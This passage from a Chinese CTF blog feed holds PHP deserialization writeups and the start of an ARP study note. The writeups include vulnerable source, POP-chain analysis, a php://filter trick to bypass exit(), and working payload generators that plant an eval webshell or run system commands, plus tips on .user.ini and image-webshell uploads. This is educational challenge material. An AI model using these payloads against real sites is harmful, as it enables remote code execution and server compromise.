$amzing=&#x27;O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D&#x27;; </span><br><span class="line">    /*O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;R:6;&#125;*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new baby();</span><br><span class="line">// $a-&gt;bbb =&amp;$a-&gt;aaa;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>得到 payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure></div>

<p>提交得到 flag<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2vijj30mf02cjra.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2vijj30mf02cjra.jpg" class="lazyload"></a></p>
<p>pop链的构造，不仅仅是根据php魔术方法的漏洞，在执行漏洞exp，函数调用过程中，可能是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<p><a href="https://www.anquanke.com/post/id/170681">PHP反序列化入门之寻找POP链(一)</a><br><a href="https://www.t00ls.net/articles-44787.html">PHP反序列化漏洞与Webshell</a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>赵师傅的新春红包题</title>
    <url>/yakko117/2020/01/31/2020%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题] 1"></a>[2020 新春红包题] 1</h1><p><a href="https://buuoj.cn/challenges#[2020%20%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98]1">题目链接</a><br>题目改编于 <code>2019全国大学生安全运维赛 EZPOP</code></p>
<h2 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cache_filename</span>, -<span class="title function_ invoke__">strlen</span>(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getExpireTime</span>(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure></div>

<h2 id="构造pop链路"><a href="#构造pop链路" class="headerlink" title="构造pop链路"></a>构造pop链路</h2><p>首先可以看到 <code>序列化A</code>，在 <code>__destruct</code> 中调用了<code>$this-&gt;save()</code><br>在 <code>save</code> 中调用了 <code>$this-&gt;store-&gt;set</code><br>在 <code>序列化A</code> 设定 <code>$this-&gt;store</code> 为 <code>B</code><br>最后触发 <code>$result = file_put_contents($filename, $data);</code></p>
<p>详情可以参考下面链接<br><a href="https://www.anquanke.com/post/id/194036">POC利用链接</a><br><a href="https://www.anquanke.com/post/id/194269">Thinkphp 6.0反序列化链再挖掘</a></p>
<hr>
<h2 id="如何绕过-exit"><a href="#如何绕过-exit" class="headerlink" title="如何绕过 exit"></a>如何绕过 exit</h2><p>首先在 <code>B类</code> 看到 <code>prefix</code> (一个构造缓存文件名的参数）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cache_filename</span>, -<span class="title function_ invoke__">strlen</span>(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br></pre></td></tr></table></figure></div>

<p>然后文件名中含有 <code>.php</code> 就会被过滤掉<br>我们可以尝试通过改变变量重定义绕过</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;key = &#x27;/../manayakko.pHp/.&#x27;;</span><br></pre></td></tr></table></figure></div>
<p>通过 <code>/../</code> 绕过文件名随机前缀，通过 <code>/.</code> 进行绕过文件名检验</p>
<p>然后再看下面这段代码<br>这段代码会导致即便我们在后面拼接上shell也无法正常执行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$data = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure></div>

<p>通过p神的讲解我们可以知道如何绕过</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">P神的link</a></p>
<p><code>php</code> 中的 <code>base64_decode</code> 函数会忽略不符合 <code>base64</code>编码的字符， 将合法字符组成一个新的字符串进行解码，所以最终被解码的字符仅有 <code>php00000000exit</code> 和我们传入的 <code>$data</code> 变量，因为 <code>base64</code> 算法解码时是 <code>4个byte一组</code>，所以我们只要控制我们需要真正解码内容的前面部分字符长度为4的倍数就行</p>
<hr>
<h2 id="filename"><a href="#filename" class="headerlink" title="$filename"></a>$filename</h2><p>在 <code>B::getCacheKey($name)</code> 中，将 <code>$this-&gt;options[&#39;prefix&#39;]</code> 和 <code>$name</code> 拼接得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造 B::options 和 A::key</span><br><span class="line">使$filename为</span><br><span class="line">php://filter/write=convert.base64-decode/resource=uploads/manayakko.php</span><br><span class="line">进行绕过上面的</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="data"><a href="#data" class="headerlink" title="$data"></a>$data</h2><p>因此由 <code>$value=A::getForStorage()</code> 和 <code>B::serialize($value)</code> 得到<br>构造 <code>类A</code> 的 <code>cache</code> 为数组</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;dirname&#x27;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;&lt;?php eval($_GET[yakko12]);?&gt;&#x27;</span>)];</span><br></pre></td></tr></table></figure></div>

<p>就可以使得 <code>$value=A::getForStorage()</code> 的值为</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;path&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;dirname&quot;</span>:<span class="string">&quot;Jmx0Oz9waHAgZXZhbCgkX0dFVFt5YWtrbzEyXSk7PyZndDs&quot;</span>&#125;,<span class="literal">true</span>]</span><br></pre></td></tr></table></figure></div>

<p>然后再构造 <code>类B</code> 的 <code>serialize值</code> 为 <code>serialize</code>就可以使得 <code>B::serialize($value)</code> 的值为</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;path&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;dirname&quot;</span>;s:<span class="number">40</span>:<span class="string">&quot;PD9waHAgZXZhbCgkX0dFVFt5YWtrbzEyXSk7Pz4=&quot;</span>;&#125;s:<span class="number">8</span>:<span class="string">&quot;complete&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样在最后 <code>$data</code> 被 <code>base64解码</code> 的时候只有<code>php//000000000000exits64pathadirname</code> 和 <code>PD9waHAgZXZhbCgkX0dFVFt5YWtrbzEyXSk7Pz4=</code>，然后前面的字符被编码成功绕过 <code>exit</code></p>
<hr>
<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload 1"></a>Payload 1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$complete</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;/../manayakko.php/.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache = [<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;dirname&#x27;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;&lt;?php eval($_GET[yakko12]);?&gt;&#x27;</span>)];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;serialize&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=./uploads/&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()));</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload 2"></a>Payload 2</h2><p>后面看了大佬的写法，学到了大佬的操作<br>直接打命令进去，生成flag文件 获取flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$complete</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;/../yakko.phtml&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache = [<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;dirname&#x27;</span>=&gt;<span class="string">&#x27;`cat /flag &gt; ./uploads/flag.php`&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;sssss&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()));</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="还有就是"><a href="#还有就是" class="headerlink" title="还有就是"></a>还有就是</h2><p>先上传一个 <code>shell.pHp</code><br>然后再上传一个 <code>.user.ini</code><br>解析了就能挂菜刀</p>
<p>或者先写解析 <code>.user.ini</code><br>然后传图片马<br>使其追加到其他 <code>php</code> 后面作为 <code>php</code> 执行即可。<br><a href="http://althims.com/2020/01/29/buu-new-year/">Moyu 师傅的解法</a></p>
<hr>
<h1 id="最后感谢师傅们写的参考文献"><a href="#最后感谢师傅们写的参考文献" class="headerlink" title="最后感谢师傅们写的参考文献"></a>最后感谢师傅们写的参考文献</h1><p>把上面的参考总结一下<br><a href="https://www.jianshu.com/p/763427ea0e4b">EIS2019 WP</a><br><a href="https://baijiahao.baidu.com/s?id=1651516647542803980&wfr=spider&for=pc">2019高校运维赛writeup</a><br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a><br><a href="https://www.anquanke.com/post/id/194269">Thinkphp 6.0反序列化链再挖掘</a><br><a href="https://www.anquanke.com/post/id/194036">Thinkphp 6.0 新的Gadget</a><br><a href="https://www.zhaoj.in/read-6397.html">赵师傅的官方wp</a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ARP学习总结</title>
    <url>/yakko117/2020/01/14/ARP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="ARP学习总结"><a href="#ARP学习总结" class="headerlink" title="ARP学习总结"></a>ARP学习总结</h1><h2 id="ARP协议出现的原因"><a href="#ARP协议出现的原因" class="headerlink" title="ARP协议出现的原因"></a>ARP协议出现的原因</h2><p>ARP协议是 <code>&quot;Address Resolution Protocol&quot;</code>（地址解析协议）的缩写。<br>在以太网环境中，数据的传输所依赖的是MAC地址而非IP地址，ARP协议的作用是将已知IP地址转换为MAC地址。</p>
<p>由于是 <code>IP协议</code> 使用了 <code>ARP协议</code>，因此在<code>TCP/IP模型</code>里将 <strong>ARP协议划归为网络层</strong>，但是在<code>OSI七层模型</code>中，将<strong>ARP协议划归为数据链路层</strong>。</p>
<p>在局域网中，网络中实际传输的是 <code>&quot;帧&quot;</code>，帧里面有目标主机的MAC地址。在以太网中，一个主机和另一个主机进行直接通信，必须要知道目标主机的MAC地址。但这个目标MAC地址是如何获得的呢？它就是通过地址解析协议获得的。</p>
<p><code>&quot;地址解析&quot;</code> 就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。</p>
<p>ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。</p>
<h2 id="ARP映射方式"><a href="#ARP映射方式" class="headerlink" title="ARP映射方式"></a>ARP映射方式</h2><ul>
<li>静态映射<br>静态映射的意思是要手动创建一张ARP表，把逻辑（IP）地址和物理地址关联起来。这个ARP表储存在网络中的每一台机器上。例如，知道其机器的IP地址但不知道其物理地址的机器就可以通过查ARP表找出对应的物理地址。这样做有一定的局限性，因为物理地址可能发生变化：<ul>
